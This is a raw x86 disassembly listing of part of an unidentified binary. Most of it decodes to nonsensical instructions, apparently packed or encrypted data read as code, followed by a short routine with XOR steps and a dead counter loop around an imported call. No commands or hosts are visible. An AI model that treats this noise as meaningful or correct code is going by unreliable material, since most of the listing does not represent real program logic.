  4153c5:	xlat   BYTE PTR ds:[ebx]
  4153c6:	or     BYTE PTR [esi+0x6d],ch
  4153c9:	xor    bl,BYTE PTR [edi-0x4d]
  4153cc:	lods   al,BYTE PTR ds:[esi]
  4153cd:	mov    edi,0x9c499cb4
  4153d2:	push   edx
  4153d3:	jo     0x4153b7
  4153d5:	popf   
  4153d6:	and    DWORD PTR ds:0x556c9050,esp
  4153dc:	iret   
  4153dd:	les    ebp,FWORD PTR [edx]
  4153df:	out    0x2c,al
  4153e1:	cwde   
  4153e2:	push   es
  4153e3:	jns    0x4153c6
  4153e5:	mul    DWORD PTR [esi+ecx*8-0x7]
  4153e9:	cmp    DWORD PTR [edi-0x64],ebx
  4153ec:	adc    eax,0x776f2853
  4153f1:	test   BYTE PTR [esi-0x39],cl
  4153f4:	imul   ebx
  4153f6:	add    DWORD PTR [esi+0x2c],edi
  4153f9:	mov    DWORD PTR [esi-0x22],0x82f8d2fc
  415400:	sbb    BYTE PTR [ecx-0x2f],bh
  415403:	mov    ebp,0xe0a48292
  415408:	aad    0xcd
  41540a:	add    ebp,edx
  41540c:	jmp    0x83da:0xfdafbe0b
  415413:	cmp    BYTE PTR [edi+0x64],0xb9
  415417:	or     eax,0x3d118e01
  41541c:	int3   
  41541d:	mov    DWORD PTR [ebx],ecx
  41541f:	inc    edx
  415420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415421:	sti    
  415422:	and    DWORD PTR [ecx],edx
  415424:	cli    
  415425:	outs   dx,BYTE PTR ds:[esi]
  415426:	gs mov cl,0x4
  415429:	mov    al,0xea
  41542b:	cli    
  41542c:	das    
  41542d:	mov    es,WORD PTR fs:[ebx]
  415430:	jo     0x4154a6
  415432:	push   ebx
  415433:	cmp    edx,esi
  415435:	lahf   
  415436:	sbb    bh,BYTE PTR [edx-0x5d1eb395]
  41543c:	inc    eax
  41543d:	sbb    al,0xdf
  41543f:	mov    eax,0xb26e63ce
  415444:	enter  0x64da,0xf6
  415448:	adc    ecx,ecx
  41544a:	pop    eax
  41544b:	ret    
  41544c:	push   edx
  41544d:	fs xchg edx,eax
  41544f:	add    ch,ah
  415451:	mov    esi,0xfaebbce2
  415456:	mov    ds:0x21dc70c7,eax
  41545b:	jmp    0xa803aeeb
  415460:	adc    DWORD PTR [edx+0x473000b5],0x5349cc33
  41546a:	mov    esi,0x7af5798
  41546f:	mov    eax,ds:0xe12b4f37
  415474:	fmulp  st(7),st
  415476:	sub    edx,ebp
  415478:	pop    ecx
  415479:	pop    ecx
  41547a:	test   DWORD PTR [esi],0x59ce44b6
  415480:	pop    edx
  415481:	and    al,0x57
  415483:	fst    QWORD PTR [ecx+0x227005d6]
  415489:	and    eax,eax
  41548b:	xchg   ecx,eax
  41548c:	retf   0x4aba
  41548f:	add    al,0xff
  415491:	(bad)  
  415492:	push   ebx
  415493:	xor    DWORD PTR [ecx-0x3364abcc],ebx
  415499:	adc    al,0x90
  41549b:	push   cs
  41549c:	lea    eax,[edi+0x66]
  41549f:	jb     0x415432
  4154a1:	and    ecx,DWORD PTR [ebp-0x6f9532ac]
  4154a7:	pop    edx
  4154a8:	xor    al,cl
  4154aa:	fmul   st,st(6)
  4154ac:	inc    esp
  4154ad:	jbe    0x41547e
  4154af:	int3   
  4154b0:	or     eax,0xcc0c4280
  4154b5:	jp     0x4154a6
  4154b7:	sbb    BYTE PTR ds:0x2592f70b,0x20
  4154be:	out    dx,al
  4154bf:	fbstp  TBYTE PTR [edi]
  4154c1:	dec    ebp
  4154c2:	jns    0x4154e2
  4154c4:	mov    al,ds:0x35aa7399
  4154c9:	imul   ebp,eax,0x61af4fb2
  4154cf:	sub    eax,0xc11a2ca3
  4154d4:	rol    BYTE PTR [ecx-0x3e9d2c59],cl
  4154da:	ins    DWORD PTR es:[edi],dx
  4154db:	push   es
  4154dc:	ficomp WORD PTR [ecx-0x511d11e2]
  4154e2:	cli    
  4154e3:	push   edx
  4154e4:	(bad)  
  4154e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154e6:	into   
  4154e7:	jno    0x4154ac
  4154e9:	fdivrp st(6),st
  4154eb:	in     eax,dx
  4154ec:	xor    eax,0x732d76a2
  4154f1:	push   ecx
  4154f2:	xchg   ebx,eax
  4154f3:	jmp    0x233f028f
  4154f8:	ds sbb ebp,edx
  4154fb:	xchg   DWORD PTR [ebx],eax
  4154fd:	mov    edi,0xe6c3d51b
  415502:	jle    0x41551c
  415504:	out    dx,eax
  415505:	inc    eax
  415506:	jmp    0x28d:0x47714223
  41550d:	lahf   
  41550e:	jmp    0x4154cb
  415510:	mov    edx,0x5c0c7ea4
  415515:	into   
  415516:	loopne 0x4154b6
  415518:	inc    eax
  415519:	adc    al,0xa7
  41551b:	pop    esp
  41551c:	fidiv  WORD PTR [edi+0x70901622]
  415522:	mov    esi,0x402ecaf3
  415527:	sbb    BYTE PTR [eax],bh
  415529:	call   0xa40d:0x2a1aca9d
  415530:	stos   DWORD PTR es:[edi],eax
  415531:	inc    esp
  415532:	loope  0x415547
  415534:	xor    BYTE PTR [ebx+0x3b],0x1e
  415538:	inc    ebx
  415539:	mov    al,ds:0xa4eeed1c
  41553e:	or     al,BYTE PTR [ecx+edi*4]
  415541:	jl     0x415532
  415543:	bound  edi,QWORD PTR [eax+0x25]
  415546:	stc    
  415547:	jle    0x415528
  415549:	sar    DWORD PTR [edx],0x87
  41554c:	gs pop eax
  41554e:	iret   
  41554f:	cmp    ebp,edx
  415551:	dec    ebx
  415552:	retf   0x13f2
  415555:	mov    eax,0x9043b2ca
  41555a:	mov    al,0x8a
  41555c:	push   ds
  41555d:	in     al,0xed
  41555f:	or     cl,BYTE PTR [edx+eiz*4-0x2b]
  415563:	pop    ss
  415564:	pop    eax
  415565:	jne    0x41557f
  415567:	pop    es
  415568:	pop    ds
  415569:	cmp    BYTE PTR [edi-0x55766ddb],0x6e
  415570:	mov    esi,0xeb08ab35
  415575:	fst    st(7)
  415577:	jle    0x41551e
  415579:	icebp  
  41557a:	sub    ah,BYTE PTR [ecx-0x552c6e9d]
  415580:	in     eax,0xa
  415582:	cmp    DWORD PTR [ebp+eiz*8+0x4f61d809],ecx
  415589:	pop    ss
  41558a:	pop    esp
  41558b:	cmp    al,0xa9
  41558d:	in     al,dx
  41558e:	outs   dx,BYTE PTR ds:[esi]
  41558f:	inc    esp
  415590:	mov    ds,edi
  415592:	push   ss
  415593:	ins    BYTE PTR es:[edi],dx
  415594:	push   0x20d4cd69
  415599:	xchg   BYTE PTR [esi],ah
  41559b:	add    eax,0xf249d21f
  4155a0:	jne    0x415542
  4155a2:	pushf  
  4155a3:	mov    DWORD PTR [edi+ebx*2-0x2],edi
  4155a7:	push   edi
  4155a8:	lods   al,BYTE PTR ds:[esi]
  4155a9:	rcl    BYTE PTR [edi-0x76],0x3a
  4155ad:	pop    ss
  4155ae:	imul   edx,DWORD PTR [ebx],0x19e04888
  4155b4:	dec    esp
  4155b5:	add    eax,0x21b3d7e3
  4155ba:	adc    ecx,eax
  4155bc:	mov    cl,0x46
  4155be:	mov    al,0xbb
  4155c0:	sahf   
  4155c1:	sbb    al,0x8d
  4155c3:	test   al,0x59
  4155c5:	(bad)  
  4155c6:	enter  0x73a7,0x7b
  4155ca:	fidivr WORD PTR [esi-0x6e]
  4155cd:	dec    eax
  4155ce:	dec    esp
  4155cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155d0:	cmp    BYTE PTR [ebx+0x29],cl
  4155d3:	cmp    al,0xc5
  4155d5:	cmp    BYTE PTR ds:0xfbe496a0,bl
  4155db:	and    edx,DWORD PTR [esi]
  4155dd:	and    al,BYTE PTR [edx-0x52]
  4155e0:	mov    al,0xab
  4155e2:	stos   BYTE PTR es:[edi],al
  4155e3:	jne    0x415620
  4155e5:	dec    eax
  4155e6:	outs   dx,BYTE PTR ds:[esi]
  4155e7:	cmp    BYTE PTR [eax-0x23],cl
  4155ea:	xor    DWORD PTR [edx-0x4386fe3e],ecx
  4155f0:	mov    eax,0xbec280b5
  4155f5:	xor    BYTE PTR [eax],0x78
  4155f8:	call   0xa1c2fbd0
  4155fd:	(bad)  
  4155ff:	xor    al,0xcd
  415601:	push   edi
  415602:	jg     0x415588
  415604:	out    dx,eax
  415605:	adc    al,BYTE PTR [edx]
  415607:	inc    ebx
  415608:	in     al,dx
  415609:	std    
  41560a:	loope  0x4155a2
  41560c:	xor    al,0x6e
  41560e:	xchg   ebp,eax
  41560f:	mov    eax,DWORD PTR [edx+0x3d2c72ba]
  415615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415616:	push   ss
  415617:	popa   
  415618:	mov    edi,?
  41561a:	sar    BYTE PTR [edx+edi*8+0x7b],0xb1
  41561f:	xor    dh,BYTE PTR [ebx-0x6]
  415622:	shr    DWORD PTR [edx+ebx*1],1
  415625:	(bad)  
  415626:	hlt    
  415627:	scas   eax,DWORD PTR es:[edi]
  415628:	or     DWORD PTR [ecx-0x203d3b2b],ebp
  41562e:	push   cs
  41562f:	in     eax,dx
  415630:	xor    al,0x71
  415632:	sub    al,BYTE PTR [ebp-0x6c62f83]
  415638:	jns    0x41569c
  41563a:	loop   0x41565a
  41563c:	mov    cl,0x9a
  41563e:	xlat   BYTE PTR ds:[ebx]
  41563f:	push   0x46d23749
  415644:	gs pop esi
  415646:	fldenv [ebx-0x3810ba49]
  41564c:	xchg   esi,eax
  41564d:	cdq    
  41564e:	adc    bh,BYTE PTR [ecx+0x78]
  415651:	mov    ds:0x4d33db17,eax
  415656:	aad    0xe
  415658:	push   edx
  415659:	stos   BYTE PTR es:[edi],al
  41565a:	xor    dl,BYTE PTR [eax+0x4f]
  41565d:	in     eax,0x8c
  41565f:	push   ds
  415660:	mov    ch,0x67
  415662:	add    bl,BYTE PTR [eax]
  415664:	or     eax,0x7b991925
  415669:	cmp    bh,BYTE PTR [ecx-0x65eec5d0]
  41566f:	stos   BYTE PTR es:[edi],al
  415670:	pop    edi
  415671:	rcl    dl,cl
  415673:	mov    ebx,0x5d6a08c3
  415678:	in     al,0x76
  41567a:	mov    ebx,0xb6fb46f7
  41567f:	into   
  415680:	popa   
  415681:	push   esp
  415682:	in     al,dx
  415683:	retf   
  415684:	sar    DWORD PTR [ecx+ecx*4-0x17],0x6f
  415689:	(bad)  
  41568a:	pop    ds
  41568b:	xchg   esi,eax
  41568c:	sub    ch,BYTE PTR [eax-0x21]
  41568f:	clc    
  415690:	js     0x41570a
  415692:	iret   
  415693:	ret    0x2b0a
  415696:	mov    al,0xd0
  415698:	pop    ds
  415699:	mov    esi,?
  41569b:	push   esi
  41569c:	test   BYTE PTR [edi+eiz*4+0x1],ch
  4156a0:	jne    0x41571e
  4156a2:	sub    bl,bl
  4156a4:	mov    ecx,DWORD PTR [ebx]
  4156a6:	shl    al,cl
  4156a8:	adc    eax,0xee1b30e
  4156ad:	(bad)  
  4156ae:	and    eax,0xe8756108
  4156b3:	scas   eax,DWORD PTR es:[edi]
  4156b4:	in     al,0x64
  4156b6:	aam    0x52
  4156b8:	aaa    
  4156b9:	sbb    BYTE PTR [eax+0x5c],bh
  4156bc:	jmp    0xbf2d:0x87ff5b19
  4156c3:	enter  0x33c8,0x12
  4156c7:	out    0xa,al
  4156c9:	jno    0x415743
  4156cb:	sbb    al,0x5f
  4156cd:	inc    eax
  4156ce:	mov    ds:0x805c962f,al
  4156d3:	aaa    
  4156d4:	pop    es
  4156d5:	jb     0x4156cc
  4156d7:	inc    ecx
  4156d8:	mov    ebp,0xafc26658
  4156dd:	repnz fmulp st(6),st
  4156e0:	fbstp  TBYTE PTR [eax-0x10]
  4156e3:	mov    dl,0xf4
  4156e5:	mov    al,0x59
  4156e7:	ss xchg edx,eax
  4156e9:	add    BYTE PTR [eax],cl
  4156eb:	add    eax,0x95bb5532
  4156f0:	pop    edi
  4156f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f2:	add    eax,ebp
  4156f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156f5:	mov    edi,0x14268eb5
  4156fa:	xchg   ecx,eax
  4156fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156fc:	imul   ebx,DWORD PTR [edi],0x2
  4156ff:	es mov dh,al
  415702:	xchg   esp,eax
  415703:	jge    0x415717
  415705:	leave  
  415706:	je     0x4156fe
  415708:	jmp    0x41570a
  41570a:	jmp    0x155cdf8b
  41570f:	sub    BYTE PTR [ebp+edx*1-0x1d29351],ch
  415716:	pop    ebx
  415717:	inc    esp
  415718:	sub    eax,0xa6ee1548
  41571d:	fcom   DWORD PTR [edi]
  41571f:	loopne 0x415732
  415721:	sbb    ecx,DWORD PTR [eax]
  415723:	loop   0x4156e6
  415725:	lea    esi,[eax+0x25ea3d3a]
  41572b:	xchg   ecx,eax
  41572c:	pop    ds
  41572d:	mov    al,0x33
  41572f:	jno    0x41573c
  415731:	or     esp,DWORD PTR [edx-0x4c]
  415734:	pushf  
  415735:	(bad)  
  415736:	setne  BYTE PTR [edi-0x3e]
  41573a:	inc    esi
  41573b:	sub    dh,BYTE PTR [esi-0x1b]
  41573e:	pop    edx
  41573f:	jmp    edx
  415741:	(bad)  
  415742:	ret    0x4a9a
  415745:	test   DWORD PTR [edi-0x40f0259b],edx
  41574b:	inc    edi
  41574c:	cmp    al,0x51
  41574e:	mov    al,ds:0x7afea97b
  415753:	and    DWORD PTR [esp+esi*4+0x0],ebx
  415757:	cmp    ax,0xcc42
  41575b:	ins    DWORD PTR es:[edi],dx
  41575c:	xor    edi,esi
  41575e:	loop   0x4157c5
  415760:	and    BYTE PTR [esi+0x3138063d],bh
  415766:	mov    ebx,0xd25e2eae
  41576b:	pop    ebp
  41576c:	push   ebx
  41576d:	aam    0xae
  41576f:	mov    eax,0x752266f7
  415774:	imul   edx,DWORD PTR [esi-0x587568d6],0x78
  41577b:	inc    ecx
  41577c:	pushf  
  41577d:	dec    ebp
  41577e:	pop    ds
  41577f:	call   0xd8af7686
  415784:	xchg   ebp,eax
  415785:	sub    ah,dl
  415787:	push   0x6c063204
  41578c:	inc    ecx
  41578d:	dec    esi
  41578e:	sbb    eax,0xaa1b0182
  415793:	sahf   
  415794:	mov    ebx,0xf1957807
  415799:	out    dx,eax
  41579a:	out    dx,al
  41579b:	jb     0x4157a6
  41579d:	cli    
  41579e:	addr16 or eax,0x7b772d36
  4157a4:	pusha  
  4157a5:	xor    al,BYTE PTR [ebp-0x12e4eeb0]
  4157ab:	and    BYTE PTR [edx+0x6d89c3e5],cl
  4157b1:	jb     0x415832
  4157b3:	mov    eax,DWORD PTR [edi+0x63]
  4157b6:	repnz push ebx
  4157b8:	pusha  
  4157b9:	sub    eax,0x71d8865a
  4157be:	lahf   
  4157bf:	stc    
  4157c0:	jo     0x41576f
  4157c2:	pop    ss
  4157c3:	mov    al,ds:0x1b73fcc1
  4157c8:	mov    BYTE PTR [ebp+0x62831728],ch
  4157ce:	mov    dl,0xa3
  4157d0:	retf   0xfca9
  4157d3:	ret    
  4157d4:	mov    ecx,0x6dd3e379
  4157d9:	sbb    al,0x13
  4157db:	outs   dx,BYTE PTR ds:[esi]
  4157dc:	mov    BYTE PTR [edi],dh
  4157de:	push   ss
  4157df:	les    esi,FWORD PTR [ebp-0x2aecdbfb]
  4157e5:	retf   0xb3c3
  4157e8:	sahf   
  4157e9:	aad    0xa3
  4157eb:	jo     0x4157ff
  4157ed:	enter  0x2499,0x3a
  4157f1:	cmp    ch,al
  4157f3:	out    0x94,eax
  4157f5:	idiv   BYTE PTR [esi+0x61]
  4157f8:	jae    0x415801
  4157fa:	cmp    eax,0xd17283ee
  4157ff:	callw  0x436a
  415803:	mov    al,ds:0x9999471d
  415808:	shr    BYTE PTR [esi+0x1c],0xbf
  41580c:	add    eax,0xcdfaff33
  415811:	dec    ebp
  415812:	push   esp
  415813:	das    
  415814:	mov    ch,0xe0
  415816:	aaa    
  415817:	mov    edx,gs
  415819:	ror    al,0x41
  41581c:	fwait
  41581d:	pop    esp
  41581e:	icebp  
  41581f:	stos   DWORD PTR es:[edi],eax
  415820:	sub    dh,BYTE PTR [ebx-0x7fafaa59]
  415826:	dec    esi
  415827:	mov    esi,0x92d1a834
  41582c:	sbb    DWORD PTR [esi],edx
  41582e:	jle    0x4157d3
  415830:	je     0x4157e7
  415832:	adc    edi,DWORD PTR [ebp-0x64]
  415835:	xchg   edx,eax
  415836:	mov    ecx,0xa19388b
  41583b:	inc    esp
  41583c:	std    
  41583d:	push   ecx
  41583e:	sahf   
  41583f:	ret    
  415840:	xchg   esp,eax
  415841:	fnstenv [esi-0x6f46d65a]
  415847:	adc    DWORD PTR [edi],edx
  415849:	xchg   esi,eax
  41584a:	pop    ds
  41584b:	mov    ebp,DWORD PTR ds:[edi+0x37]
  41584f:	adc    eax,ebp
  415851:	and    BYTE PTR [ebp+0x43],0x64
  415855:	(bad)  
  415856:	adc    eax,0xc642c075
  41585b:	xchg   edi,ebx
  41585d:	stos   DWORD PTR es:[edi],eax
  41585e:	or     esp,esi
  415860:	lods   eax,DWORD PTR ds:[esi]
  415861:	cdq    
  415862:	pop    ds
  415863:	xchg   ecx,eax
  415864:	frstor [esi-0x2e]
  415867:	dec    BYTE PTR [ebx+0x5a]
  41586a:	lea    ebx,[esi+0x61]
  41586d:	mov    esi,0xd46dd447
  415872:	aas    
  415873:	mov    eax,ds:0x19e31e91
  415878:	sar    DWORD PTR [eax],1
  41587a:	jnp    0x41583f
  41587c:	inc    eax
  41587d:	xchg   ecx,eax
  41587e:	jnp    0x4158da
  415880:	retf   0xcc27
  415883:	ret    
  415884:	push   ds
  415885:	push   ds
  415886:	xlat   BYTE PTR ds:[ebx]
  415887:	or     ch,BYTE PTR [edx+0x24]
  41588a:	sbb    BYTE PTR [eax],ch
  41588c:	ds in  eax,dx
  41588e:	stc    
  41588f:	dec    edi
  415890:	mov    esi,0xb74a9e12
  415895:	(bad)  
  415896:	pop    ecx
  415897:	out    dx,eax
  415898:	mov    ecx,0x4352ec89
  41589d:	sbb    bl,BYTE PTR [esi-0x111f8567]
  4158a3:	mov    dl,0x2b
  4158a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a6:	or     al,0x2a
  4158a8:	ja     0x4158d3
  4158aa:	adc    DWORD PTR [esi],edi
  4158ac:	mov    ebp,0x32053ba5
  4158b1:	loope  0x415840
  4158b3:	mov    ds:0x6fd98d,al
  4158b8:	sbb    DWORD PTR [edi],esi
  4158ba:	jbe    0x41590a
  4158bc:	scas   eax,DWORD PTR es:[edi]
  4158bd:	jnp    0x415894
  4158bf:	adc    BYTE PTR [ecx+0x5],bl
  4158c2:	or     BYTE PTR [ebx-0x59ff008e],al
  4158c8:	loope  0x41590b
  4158ca:	add    esp,ebp
  4158cc:	cmp    DWORD PTR gs:[edi-0x77],edx
  4158d0:	jbe    0x4158dc
  4158d2:	iret   
  4158d3:	aam    0xc3
  4158d5:	outs   dx,BYTE PTR ds:[esi]
  4158d6:	push   0x3f86f229
  4158db:	push   0xe8890c2
  4158e0:	in     al,dx
  4158e1:	mov    al,0xa9
  4158e3:	cwde   
  4158e4:	xlat   BYTE PTR ds:[ebx]
  4158e5:	loope  0x415942
  4158e7:	lods   eax,DWORD PTR ds:[esi]
  4158e8:	xor    ah,BYTE PTR [edx-0x634aa137]
  4158ee:	sbb    DWORD PTR [edx+0x515e342f],0x44f7075f
  4158f8:	jnp    0x415954
  4158fa:	inc    DWORD PTR [edi-0x56]
  4158fd:	cmc    
  4158fe:	int3   
  4158ff:	push   edx
  415900:	imul   ebx,DWORD PTR [eax],0x73d4a625
  415906:	jne    0x4158d6
  415908:	out    0x13,eax
  41590a:	jmp    0x6060:0x80f7a310
  415911:	lahf   
  415912:	or     eax,0x35fc093e
  415917:	stos   DWORD PTR es:[edi],eax
  415918:	cmp    BYTE PTR [edi],bh
  41591a:	mov    ah,0x6a
  41591c:	sub    eax,0xaf47b6c5
  415921:	sahf   
  415922:	out    dx,eax
  415923:	jl     0x41595c
  415925:	ins    DWORD PTR es:[edi],dx
  415926:	dec    esp
  415927:	imul   edx,esi,0xffffffbb
  41592a:	loop   0x415945
  41592c:	pop    edi
  41592d:	push   eax
  41592e:	and    eax,0x2bd19128
  415933:	imul   ebp,esi,0xffffffd3
  415936:	mov    dh,0xe6
  415938:	mov    ah,0xfb
  41593a:	push   0xb
  41593c:	cmp    eax,0x9ad1d8a1
  415941:	and    DWORD PTR [esp+ecx*2+0xa],edx
  415945:	cmp    eax,0x691b0317
  41594a:	and    eax,DWORD PTR [edi]
  41594c:	int3   
  41594d:	mov    al,ds:0x2938f895
  415952:	retf   0x16de
  415955:	adc    ch,BYTE PTR [eax+0x43be344b]
  41595b:	ds inc edi
  41595d:	fwait
  41595e:	pop    ds
  41595f:	jecxz  0x4158f1
  415961:	push   eax
  415962:	xor    esp,DWORD PTR [ebx-0x4c68f22e]
  415968:	scas   al,BYTE PTR es:[edi]
  415969:	call   0x59e8:0xfff997ae
  415970:	and    al,0xbb
  415972:	mov    cl,0xcb
  415974:	fcmove st,st(0)
  415976:	ja     0x415910
  415978:	jle    0x415986
  41597a:	adc    eax,0xbbe7c90c
  41597f:	arpl   si,bx
  415981:	inc    ebx
  415982:	leave  
  415983:	mov    cs,WORD PTR [esi+0x56]
  415986:	sbb    eax,0x88bf9d6a
  41598b:	por    mm0,QWORD PTR [esi]
  41598e:	(bad)  
  41598f:	push   edx
  415990:	adc    DWORD PTR [ecx+0x8199a66],eax
  415996:	or     bh,cl
  415998:	(bad)
  41599c:	fbld   TBYTE PTR [edi-0x3ad032d1]
  4159a2:	pop    ebx
  4159a3:	shr    DWORD PTR [ebx-0x6373c850],cl
  4159a9:	xor    eax,0x89fbd240
  4159ae:	push   esi
  4159af:	cmp    eax,0x47d448f4
  4159b4:	or     dh,cl
  4159b6:	data16 fcomp QWORD PTR [edx+0x2c0a1e53]
  4159bd:	xchg   ebp,eax
  4159be:	inc    ecx
  4159bf:	test   al,0x8d
  4159c1:	test   esp,0xf0e9b8c8
  4159c7:	jge    0x4159e2
  4159c9:	test   al,0x28
  4159cb:	add    eax,0x2070320d
  4159d0:	adc    edx,esi
  4159d2:	cli    
  4159d3:	fistp  QWORD PTR [ebp+0x5613c015]
  4159d9:	mov    ecx,0x9a1a865b
  4159de:	fisttp QWORD PTR [ebx]
  4159e0:	inc    esp
  4159e1:	fucomp st(4)
  4159e3:	je     0x4159b5
  4159e5:	sub    eax,0x34ebbe4f
  4159ea:	outs   dx,BYTE PTR ds:[esi]
  4159eb:	retf   
  4159ec:	jns    0x4159c9
  4159ee:	mov    ebp,0x4265684b
  4159f3:	daa    
  4159f4:	jl     0x415987
  4159f6:	shl    BYTE PTR [eax-0x80],0x16
  4159fa:	add    eax,0x4eb5af6b
  4159ff:	outs   dx,BYTE PTR ds:[esi]
  415a00:	addr16 mov esi,0x629bec80
  415a06:	adc    dl,BYTE PTR ds:0x974129c9
  415a0c:	mov    bl,BYTE PTR [ebp+0x1871f266]
  415a12:	retf   
  415a13:	sub    eax,0xfad84148
  415a18:	stos   BYTE PTR es:[edi],al
  415a19:	xlat   BYTE PTR ds:[ebx]
  415a1a:	jne    0x415a50
  415a1c:	or     ebx,ecx
  415a1e:	sbb    eax,0x86fa73ff
  415a23:	je     0x4159d1
  415a25:	loope  0x415a93
  415a27:	mov    es,WORD PTR [ecx-0x80]
  415a2a:	cmp    al,BYTE PTR [ecx+eax*2+0x6d]
  415a2e:	out    0xc6,al
  415a30:	sbb    BYTE PTR ds:0xbd95d06a,bl
  415a36:	jge    0x4159cc
  415a38:	mov    esp,0xac786bc3
  415a3d:	fst    DWORD PTR [eax+0x63624587]
  415a43:	not    DWORD PTR [eax+0x4a]
  415a46:	aam    0xdc
  415a48:	mov    eax,ds:0x94f1e138
  415a4d:	pop    eax
  415a4e:	mov    bh,0x9e
  415a50:	pop    ss
  415a51:	mov    edx,0x8e682892
  415a56:	mov    edx,ecx
  415a58:	cld    
  415a59:	int3   
  415a5a:	lods   al,BYTE PTR ds:[esi]
  415a5b:	nop
  415a5c:	push   cs
  415a5d:	in     al,0x6
  415a5f:	mov    BYTE PTR [ecx],al
  415a61:	and    al,BYTE PTR [edx-0x3b21876c]
  415a67:	popf   
  415a68:	cmp    BYTE PTR [edx-0x61],dh
  415a6b:	jecxz  0x415a34
  415a6d:	and    al,0x8a
  415a6f:	mov    al,ds:0x2ac443c3
  415a74:	jg     0x415a77
  415a76:	push   edx
  415a77:	dec    ebx
  415a78:	pop    esp
  415a79:	mov    esi,0x3554b15c
  415a7e:	push   edx
  415a7f:	push   ebp
  415a80:	shl    edx,cl
  415a82:	inc    edx
  415a83:	leave  
  415a84:	add    dh,BYTE PTR [ebp+0x27]
  415a87:	iret   
  415a88:	push   0x1302915c
  415a8d:	out    dx,eax
  415a8e:	push   eax
  415a8f:	push   edi
  415a90:	mov    ds:0x8bc53516,al
  415a95:	test   DWORD PTR [ebp-0x7e],ebp
  415a98:	or     eax,0xaa934bbe
  415a9d:	(bad)  
  415a9e:	mov    ecx,0xe2f4e567
  415aa3:	mov    ebp,0x7615abd5
  415aa8:	sti    
  415aa9:	or     BYTE PTR [esp+edi*4-0x62],cl
  415aad:	je     0x415aed
  415aaf:	push   cs
  415ab0:	fsub   DWORD PTR [ecx-0x9]
  415ab3:	(bad)
  415ab7:	scas   eax,DWORD PTR es:[edi]
  415ab8:	mov    ch,0xbe
  415aba:	inc    esp
  415abb:	mov    ds:0xf23af19f,eax
  415ac0:	inc    eax
  415ac1:	add    ebp,DWORD PTR [esi]
  415ac3:	xchg   esp,eax
  415ac4:	cmp    edi,ebp
  415ac6:	pushf  
  415ac7:	das    
  415ac8:	adc    ch,BYTE PTR [edi+0x3d]
  415acb:	neg    BYTE PTR [esi-0x70]
  415ace:	and    ch,ah
  415ad0:	shl    DWORD PTR [ecx+0x302b9487],cl
  415ad6:	pop    es
  415ad7:	sbb    eax,0x77
  415ada:	mov    al,0x47
  415adc:	sub    DWORD PTR [ecx+0x132fa578],edi
  415ae2:	mov    cl,0xeb
  415ae4:	jg     0x415ad7
  415ae6:	pop    ebx
  415ae7:	and    DWORD PTR [edx-0x1f],0x4d65770a
  415aee:	mov    eax,edi
  415af0:	fcmovne st,st(7)
  415af2:	adc    al,dl
  415af4:	ret    0xbe25
  415af7:	fist   DWORD PTR [edx-0x4c]
  415afa:	pop    es
  415afb:	xchg   esi,eax
  415afc:	repnz aaa 
  415afe:	(bad)  
  415aff:	shl    WORD PTR ds:0x7010650f,1
  415b06:	sbb    eax,0x354cc8bc
  415b0b:	jns    0x415b1a
  415b0d:	dec    edx
  415b0e:	inc    edx
  415b0f:	xchg   edx,eax
  415b10:	stos   DWORD PTR es:[edi],eax
  415b11:	fimul  DWORD PTR [esi+0x67]
  415b14:	jbe    0x415b39
  415b16:	ins    BYTE PTR es:[edi],dx
  415b17:	test   BYTE PTR [edx],bh
  415b19:	inc    ebx
  415b1a:	push   ss
  415b1b:	jb     0x415b48
  415b1d:	or     DWORD PTR [esi],edi
  415b1f:	or     DWORD PTR [eax-0x3f],eax
  415b22:	stc    
  415b23:	hlt    
  415b24:	in     al,dx
  415b25:	pop    ebp
  415b26:	inc    ebp
  415b27:	and    al,0xcf
  415b29:	inc    esi
  415b2a:	test   BYTE PTR [esi+eiz*8],0x3a
  415b2e:	mov    al,ds:0x8da4ff8e
  415b33:	xchg   esi,eax
  415b34:	jns    0x415b3f
  415b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b37:	mov    edx,DWORD PTR fs:[ebp+0xc]
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0xb81e18bc
  415bea:	ret    0xd2e
  415bed:	inc    edi
  415bee:	popa   
  415bef:	bound  edx,QWORD PTR [edx+0x5f]
  415bf2:	bound  esp,QWORD PTR [edx+0x48]
  415bf5:	out    0x4a,al
  415bf7:	inc    esp
  415bf8:	mov    ds:0xb2621363,eax
